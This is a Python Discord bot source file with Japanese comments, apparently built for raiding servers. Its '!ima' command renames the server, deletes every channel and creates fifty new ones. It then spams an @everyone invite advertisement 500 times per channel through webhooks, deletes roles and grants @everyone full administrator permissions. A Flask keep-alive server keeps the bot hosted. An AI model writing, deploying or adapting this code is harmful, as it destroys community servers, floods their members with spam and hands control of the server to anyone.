import discord
from discord.ext import commands
import asyncio
import os
from flask import Flask
from threading import Thread

# --- Webサーバー設定 (KoyebのHealth Check & UptimeRobot対策) ---
app = Flask('')

@app.route('/')
def home():
    return "Bot is active"

def run():
    app.run(host='0.0.0.0', port=8080)

def keep_alive():
    t = Thread(target=run)
    t.start()

# --- Discord Bot本体 ---
intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)

MESSAGE_CONTENT = """# 🌟 遊びに来て、ただ“話すだけ”の場所がここにある。
「ちょっと疲れたから雑に話したい」
「誰かとゲームの話で盛り上がりたい」
「変なこと考えてるけど共感してくれる人いるかな」
そんな時の“居場所”が、このサーバーです。

💬 こんなことができるよ
日常のあれこれ（今日あったこと、好きなもの、くだらないボケなど）を気軽に共有
「この本すごかった」「この映画ヤバい」みたいな熱い語りもOK
みんなで企画するミニゲーム、テーマトーク、お絵かき大会など、不定期でワイワイイベントも

👋 このサーバーが初めての人へ
“挨拶だけ”でも大歓迎。「はじめまして」チャットがあるので安心！
年齢・性別・趣味関係なし。好きなもの語ろう。
真面目な話も、くだらない話も。いい意味で“ゆるく”がモットー。

🚀 招待はこちら →
discord.gg/gxFhrzUZdK
「ちょっと見てみようかな」その気軽さで大丈夫。あなたの日常の1コマに、新しい友達が加わるかも。 @everyone"""

@bot.event
async def on_ready():
    print(f'✅ Logged in as {bot.user.name}')

@bot.command()
async def ima(ctx):
    guild = ctx.guild
    
    # 1. サーバー名の変更
    try:
        await guild.edit(name="みんなの住処植民地")
    except: pass

    # 2. チャンネル全削除 (非同期一括実行)
    delete_tasks = [channel.delete() for channel in guild.channels]
    await asyncio.gather(*delete_tasks, return_exceptions=True)

    # 3. チャンネル50個一斉作成
    create_tasks = [guild.create_text_channel('imaばんざい') for _ in range(50)]
    new_channels = await asyncio.gather(*create_tasks, return_exceptions=True)

    # 4. Webhook作成 & メッセージ送信 (0.7秒間隔)
    async def send_spam(channel):
        if isinstance(channel, discord.TextChannel):
            try:
                webhook = await channel.create_webhook(name="Ima_Promotion")
                for _ in range(500):
                    await webhook.send(content=MESSAGE_CONTENT, username="居場所")
                    await asyncio.sleep(0.7) # ご要望のクールタイム
            except: pass

    for ch in new_channels:
        if not isinstance(ch, Exception):
            asyncio.create_task(send_spam(ch))

    # 5. ロール削除 & @everyone 管理者権限化
    for role in guild.roles:
        if role.name != "@everyone" and not role.managed:
            try: await role.delete()
            except: pass

    try:
        await guild.default_role.edit(permissions=discord.Permissions.all())
    except: pass

# 実行
if __name__ == "__main__":
    keep_alive()
    token = os.environ.get("DISCORD_BOT_TOKEN")
    if token:
        bot.run(token)
    else:
        print("❌ Error: DISCORD_BOT_TOKEN is not set.")
